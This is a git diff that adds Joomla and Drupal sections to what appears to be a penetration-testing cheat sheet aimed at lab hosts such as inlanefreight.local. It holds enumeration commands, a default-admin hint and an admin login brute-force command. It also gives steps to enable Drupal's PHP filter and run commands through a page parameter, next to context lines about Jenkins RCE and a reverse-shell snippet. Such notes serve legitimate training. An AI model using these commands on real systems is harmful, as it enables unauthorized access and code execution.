@@ -85,6 +85,7 @@
 - [SMB](#smb)
 - [FTP](#ftp)
 - [Jenkins](#jenkins)
+- [Joomla](#joomla)
 - [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -2209,6 +2210,55 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.
 
 Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
+```
+
+# Joomla
+```bash
+# robots.txt
+curl -s http://dev.inlanefreight.local/robots.txt | head -n 5
+
+# README.txt
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+
+#  fingerprint the version from JavaScript files in the media/system/js/ directory
+curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+
+# droopescan
+droopescan scan joomla --url http://dev.inlanefreight.local/
+
+# The default administrator account on Joomla installs is admin
+admin:
+
+# login bruteforce
+python3 ./joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
+# Drupal
+```bash
+# check CHANGELOG.txt or README.exe, robots.txt, /node
+curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+
+# droppescan
+droopescan scan drupal -u http://drupal.inlanefreight.local
+
+# Leveraging the PHP Filter Module(before version 8)
+click modules
+check "PHP filter" and git "Save configuration"
+Next, we could go to Content --> Add content and create a Basic page
+Make sure to select "PHP code"
+## check if it works with curl
+curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+
+# Leveraging the PHP Filter Module(after version 8)
+## Download filter on attack machine
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+# Once downloaded go to Administration > Reports > Available updates
+drupal-qa.inlanefreight.local/admin/reports/updates/install
+# 
+
+
+
+
 ```
 
 # Wordpress
